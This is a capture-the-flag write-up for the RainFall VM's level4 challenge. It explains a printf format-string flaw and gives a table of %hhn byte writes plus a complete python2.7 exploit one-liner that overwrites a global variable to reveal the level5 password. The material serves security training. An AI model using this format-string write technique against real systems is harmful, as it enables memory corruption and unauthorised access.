# level4 → level5

`n` reads a line, then `p` passes it directly to `printf` as a format
string. Global `m` at `0x08049810` must equal `0x01025544` (16930116).
The first input word is `printf`'s twelfth apparent argument. Put the four
successive byte addresses at the start of the input, then use `%hhn` to
write each byte. The format widths account for the 16 address bytes already
printed and for wraparound modulo 256:

| Target byte | Desired value | Printed count before write | Additional width |
| --- | ---: | ---: | ---: |
| `m[0]` | `0x44` | 16 | 52 |
| `m[1]` | `0x55` | 68 | 17 |
| `m[2]` | `0x02` | 85 | 173 |
| `m[3]` | `0x01` | 258 | 255 |

From the level4 account on the RainFall VM:

```sh
python2.7 -c 'import struct; print struct.pack("<IIII",0x08049810,0x08049811,0x08049812,0x08049813) + "%12$52c%12$hhn%13$17c%13$hhn%14$173c%14$hhn%15$255c%15$hhn"' | ./level4
```

The program calls `/bin/cat /home/user/level5/.pass` when the write
succeeds. Its output can precede buffered `printf` padding in a pipe.
Inspect `n`, `p`, and `m` with `objdump` or GDB to confirm the addresses.
